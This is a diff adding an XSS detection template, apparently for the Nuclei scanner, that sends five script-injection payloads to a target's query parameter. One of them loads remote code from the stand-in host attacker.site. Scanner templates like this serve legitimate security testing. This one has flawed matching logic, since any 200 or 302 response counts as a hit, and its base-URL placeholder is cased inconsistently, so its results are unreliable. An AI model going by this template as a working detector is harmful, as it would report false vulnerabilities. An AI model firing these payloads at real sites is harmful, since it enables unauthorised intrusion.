@@ -1,0 +1,35 @@
+id: example-xss-detection
+info:
+  name: Example XSS Detection
+  author: yourname
+  severity: high
+  description: Basic XSS Detection using various payloads
+  reference: https://owasp.org/www-community/attacks/xss/
+
+requests:
+  - method: GET
+    path:
+      - "{{BASEURL}}?q=<script>alert('XSS1')</script>"
+      - "{{BaseURL}}?q=<img src='x' onerror='alert(\"XSS2\")'>"
+      - "{{BaseURL}}?q=<svg onload='alert(\"XSS3\")'></svg>"
+      - "{{BaseURL}}?q=<img src=x:alert(1)>"
+      - "{{BaseURL}}?q=<script src=https://attacker.site/evil.js></script>"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        words:
+          - "XSS1"
+          - "XSS2"
+          - "XSS3"
+        part: body
+        condition: or
+
+
+
+
+
+
